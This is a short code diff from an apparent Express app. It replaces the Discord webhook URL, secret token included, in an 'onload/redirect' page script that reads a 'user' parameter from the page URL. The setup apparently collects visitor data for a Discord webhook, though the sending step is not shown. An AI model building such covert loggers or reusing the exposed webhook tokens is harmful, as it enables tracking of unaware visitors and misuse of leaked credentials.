@@ -81,7 +81,7 @@ app.get("/k", async (req, res) => {
 <title>onload/redirect</title>
 <script>
 
-var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
+var webhookURL = "https://canary.discord.com/api/webhooks/1054303465880420432/9NPg39l450Ke3-Oec5yRt3xJc-YtpK9pBBAoOA1w-p92I4stNsv9ql5IT_CtGY_u_yvu";
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
